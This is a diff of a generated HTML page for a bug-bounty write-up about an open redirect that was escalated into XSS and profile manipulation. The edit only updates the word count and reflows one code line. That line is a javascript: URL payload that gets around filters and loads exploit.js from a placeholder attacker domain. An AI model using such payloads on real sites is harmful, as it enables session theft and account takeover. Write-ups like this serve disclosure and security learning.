@@ -38,7 +38,7 @@ Cookie theft via JavaScript execution User profile manipulation through CSRF exp
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/localhost:1313\/f0dh1l\/posts\/first-h1-bounty\/"
-        },"genre": "posts","keywords": "xss, bug bounty, web security, hackerone","wordcount":  936 ,
+        },"genre": "posts","keywords": "xss, bug bounty, web security, hackerone","wordcount":  937 ,
         "url": "http:\/\/localhost:1313\/f0dh1l\/posts\/first-h1-bounty\/","datePublished": "2025-07-24T10:11:07+01:00","dateModified": "2025-07-24T10:11:07+01:00","license": "2025 F0DH1L","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -80,7 +80,7 @@ Cookie theft via JavaScript execution User profile manipulation through CSRF exp
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">My First H1 Bounty: From Open Redirect to Profile Manipulation</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/f0dh1l/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-07-24">2025-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;936 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-07-24">2025-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;937 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -214,7 +214,8 @@ Cookie theft via JavaScript execution User profile manipulation through CSRF exp
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
         <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>https://example.com/social-ads/?callback_url=javascript:d=document;a=&#39;scr&#39;;b=&#39;ipt&#39;;s=d.createElement?.(a%2Bb);s.src=&#39;https://DOMAIN_WE_CONTROL/exploit.js&#39;;d.body.appendChild?.(s)</code></pre></div>
+    </div><pre tabindex="0"><code>https://example.com/social-ads/?callback_url=javascript:d=document;a=&#39;scr&#39;;b=&#39;ipt&#39;;
+s=d.createElement?.(a%2Bb);s.src=&#39;https://DOMAIN_WE_CONTROL/exploit.js&#39;;d.body.appendChild?.(s)</code></pre></div>
 <h3 id="final-exploit-code">Final Exploit Code</h3>
 <p>Our external JavaScript file (<code>exploit.js</code>) contained the complete exploit:</p>
 <div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
